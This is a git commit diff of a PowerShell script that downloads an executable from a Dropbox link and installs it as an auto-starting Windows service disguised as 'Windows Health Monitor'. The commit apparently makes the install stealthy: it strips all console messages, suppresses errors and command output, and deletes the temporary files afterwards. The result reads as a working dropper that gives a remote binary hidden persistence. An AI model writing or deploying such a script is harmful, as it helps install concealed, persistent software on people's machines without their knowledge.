71d30936d02e652639c4861598612c31d37df3c3
Nur Mohammad Rafi <144477870+ostwrafi@users.noreply.github.com>
2026-02-21 16:28:03 +0600

    Update deploy.ps1

--- deploy.ps1
+++ deploy.ps1
@@ -1,6 +1,6 @@
+$ErrorActionPreference = "SilentlyContinue"
 
-$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=q4816g06&dl=1"
-
+$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=kb4x9ws1&dl=1"
 $WorkDir = "$env:TEMP\WinHealthInstall"
 $ClientExe = "$WorkDir\MonitorClient.exe"
 $ServiceName = "WindowsHealthMonitor"
@@ -8,69 +8,41 @@ $ServiceDisplay = "Windows Health Monitor Service"
 $InstallDir = "$env:ProgramData\WindowsHealth"
 $TargetExe = "$InstallDir\MonitorClient.exe"
 
-
-
-Write-Host "[*] Starting Service Deployment..." -ForegroundColor Cyan
-
-
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Warning "[-] Script is not running as Administrator. Service installation will fail."
-    Write-Host "    Please run PowerShell as Administrator." -ForegroundColor Red
     exit
 }
-
 
 if (-not (Test-Path $WorkDir)) {
     New-Item -Path $WorkDir -ItemType Directory | Out-Null
 }
 
-
 try {
-    Write-Host "    [*] Downloading MonitorClient..."
     Invoke-WebRequest -Uri $ClientUrl -OutFile $ClientExe -UseBasicParsing
-    if (-not (Test-Path $ClientExe)) { throw "Download failed." }
+    if (-not (Test-Path $ClientExe)) { exit }
 }
 catch {
-    Write-Error "[-] Error Downloading File: $_"
     exit
 }
 
-
 Unblock-File -Path $ClientExe
-
 
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory | Out-Null
 }
 
-
 $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
 if ($service) {
-    Write-Host "    [*] Stopping existing service..."
     Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
 }
 
-Write-Host "    [*] Moving binary to: $InstallDir"
 Copy-Item -Path $ClientExe -Destination $TargetExe -Force
 
-
-Write-Host "    [*] Creating Windows Service..."
-
 $binPath = "`"$TargetExe`""
-sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= $ServiceDisplay
+sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= $ServiceDisplay | Out-Null
+sc.exe description $ServiceName "Monitors system health and telemetry." | Out-Null
 
-
-sc.exe description $ServiceName "Monitors system health and telemetry."
-
-
-Write-Host "    [*] Starting Service..."
 Start-Service -Name $ServiceName
+Remove-Item -Path $WorkDir -Recurse -Force | Out-Null
 
-
-Write-Host "    [*] Cleaning up Temp..."
-Remove-Item -Path $WorkDir -Recurse -Force
-
-Write-Host "[+] Service Installation Complete!" -ForegroundColor Green
-Write-Host "    Service: $ServiceName"
-Write-Host "    Status:  Running (Auto-Start)"
+exit
